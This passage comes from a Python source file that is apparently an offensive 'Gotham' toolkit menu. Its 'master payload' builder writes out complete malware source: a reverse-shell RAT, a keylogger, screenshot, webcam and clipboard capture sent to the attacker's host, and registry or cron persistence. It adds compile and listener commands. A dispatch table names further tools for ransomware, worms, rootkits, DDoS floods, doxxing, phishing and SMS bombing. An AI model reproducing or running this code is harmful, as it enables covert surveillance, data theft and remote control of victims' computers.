        console.print("[green]  [+] DMCA template → gotham_dmca.txt[/green]")
    elif choice == "3":
        console.print("[dim]  [!] Use gotham_ssh_brute or hash_crack to get creds first[/dim]")
    elif choice == "4":
        console.print("[dim]  [!] Run phish_kit → steal cookie → use cookie editor extension[/dim]")

# ── 50. MASTER PAYLOAD ────────────────────────────────────────────────────────
def master_payload():
    gotham_header("Gotham Master Payload")
    lhost = input(Fore.YELLOW + "  [>] LHOST: " + Style.RESET_ALL).strip()
    lport = input(Fore.YELLOW + "  [>] LPORT: " + Style.RESET_ALL).strip() or "4444"
    out   = input(Fore.YELLOW + "  [>] Output name: " + Style.RESET_ALL).strip() or "gotham_master"
    code = f'''#!/usr/bin/env python3
# GothamMaster — All-in-one payload — Powered by Maxime Leal
# Combines: RAT + keylogger + screen + cam + clipboard + persistence
# pip install pynput pyautogui opencv-python requests pyperclip
import socket, subprocess, os, threading, time, platform, json
import requests, pyautogui, cv2, pyperclip
from pynput import keyboard

LHOST = "{lhost}"
LPORT = {lport}
INTERVAL_SCREEN = 60
INTERVAL_CAM    = 120
INTERVAL_KEYS   = 30

keys_buf = []

def on_press(k):
    try: keys_buf.append(k.char)
    except: keys_buf.append(f"[{{k.name}}]")

def exfil(type_, data):
    try: requests.post(f"http://{{LHOST}}:{{LPORT}}/exfil",json={{"t":type_,"d":data}},timeout=4)
    except: pass

def rat_connect():
    while True:
        try:
            s = socket.socket(); s.connect((LHOST, int(LPORT)))
            s.send(json.dumps({{"os":platform.system(),"node":platform.node(),"user":os.getlogin()}}).encode())
            while True:
                cmd = s.recv(4096).decode().strip()
                if not cmd: break
                if cmd=="exit": s.close(); return
                if cmd.startswith("cd "):
                    try: os.chdir(cmd[3:]); s.send(os.getcwd().encode())
                    except Exception as e: s.send(str(e).encode())
                else:
                    out = subprocess.getoutput(cmd)
                    s.send((out or "[no output]").encode())
        except: time.sleep(5)

def persistence():
    if platform.system()=="Windows":
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key,"GothamUpdate",0,winreg.REG_SZ,os.path.abspath(__file__))
        winreg.CloseKey(key)
    else:
        cron = f"@reboot python3 {{os.path.abspath(__file__)}} &\\n"
        try:
            existing = subprocess.getoutput("crontab -l")
            if "GothamUpdate" not in existing:
                subprocess.run(f"(crontab -l; echo '# GothamUpdate\\n{{cron}}') | crontab -", shell=True)
        except: pass

def screen_loop():
    while True:
        time.sleep(INTERVAL_SCREEN)
        try:
            import io, base64
            img = pyautogui.screenshot()
            buf = io.BytesIO(); img.save(buf,"PNG")
            exfil("screen", base64.b64encode(buf.getvalue()).decode())
        except: pass

def cam_loop():
    while True:
        time.sleep(INTERVAL_CAM)
        try:
            import base64
            cap = cv2.VideoCapture(0); ret, frame = cap.read(); cap.release()
            if ret:
                _, buf = cv2.imencode(".jpg", frame)
                exfil("cam", base64.b64encode(bytes(buf)).decode())
        except: pass

def clip_loop():
    last=""
    while True:
        time.sleep(5)
        c = pyperclip.paste()
        if c!=last: last=c; exfil("clip", c)

def keys_loop():
    while True:
        time.sleep(INTERVAL_KEYS)
        if keys_buf: d="".join(keys_buf); keys_buf.clear(); exfil("keys",d)

persistence()
for fn in [rat_connect, screen_loop, cam_loop, clip_loop, keys_loop]:
    threading.Thread(target=fn, daemon=True).start()
with keyboard.Listener(on_press=on_press) as l: l.join()
'''
    fname = f"{out}.py"
    with open(fname,"w") as f: f.write(code)
    console.print(f"[green]  [+] Master payload → {fname}[/green]")
    console.print(f"[cyan]  [!] Compile: pyinstaller --onefile --noconsole {fname}[/cyan]")
    console.print(f"[cyan]  [!] Listener + exfil server: nc -lvnp {lport} (RAT)[/cyan]")
    console.print(f"[dim]  [!] Also run a Flask /exfil endpoint on LPORT for data exfil[/dim]")

# ─── DISPATCH ─────────────────────────────────────────────────────────────────

DISPATCH = {
    1: rat_generator, 2: reverse_shell, 3: link_payload,
    4: keylogger_builder, 5: camera_hijack,
    6: osint_username, 7: osint_email, 8: osint_phone,
    9: osint_ip, 10: osint_domain, 11: csint_social,
    12: dox_full, 13: dox_address, 14: dox_family, 15: dox_employer,
    16: http_flood, 17: udp_flood, 18: syn_flood, 19: slowloris, 20: amp_ddos,
    21: ransomware_builder, 22: worm_gen, 23: trojan_dropper,
    24: miner_inject, 25: spyware_builder, 26: rootkit_loader,
    27: bootkit_builder, 28: poly_engine,
    29: port_scan, 30: lan_map, 31: packet_sniff,
    32: arp_spoof, 33: dns_poison,
    34: ssh_brute, 35: ftp_brute, 36: hash_crack, 37: wifi_handshake,
    38: cam_snap, 39: mic_record, 40: screen_cap, 41: clip_log,
    42: sqli_scan, 43: xss_inject, 44: lfi_scan, 45: rce_test, 46: cve_loader,
    47: phish_kit, 48: sms_bomb, 49: acct_nuke, 50: master_payload,
}

def main():
    show_banner()
    while True:
        show_menu()
        bats = [Bat() for _ in range(8)]
        for b in bats: b.move()
        console.print(Align.center(f"[yellow]{render_bats(bats, 80)}[/yellow]"))
        console.print()
        console.print("[bold red]Powered by Maxime Leal[/bold red]", justify="center")
        console.print()
        choice = input(Fore.YELLOW + "  🦇 Choose tool (1-50) or 0 to exit: " + Style.RESET_ALL).strip()
        if choice == "0":
            console.print("[bold yellow]  🦇 Gotham's darkness reclaims the bench. Stay dangerous.[/bold yellow]")
            break
        try:
            n = int(choice)
            if n in DISPATCH:
                console.print()
                DISPATCH[n]()
                console.print()
                input(Fore.CYAN + "  [Press Enter to return to menu]" + Style.RESET_ALL)
                os.system("cls" if os.name == "nt" else "clear")
            else:
                console.print("[red]  [-] Invalid tool number[/red]")
        except ValueError:
            console.print("[red]  [-] Enter a number[/red]")

if __name__ == "__main__":
    main()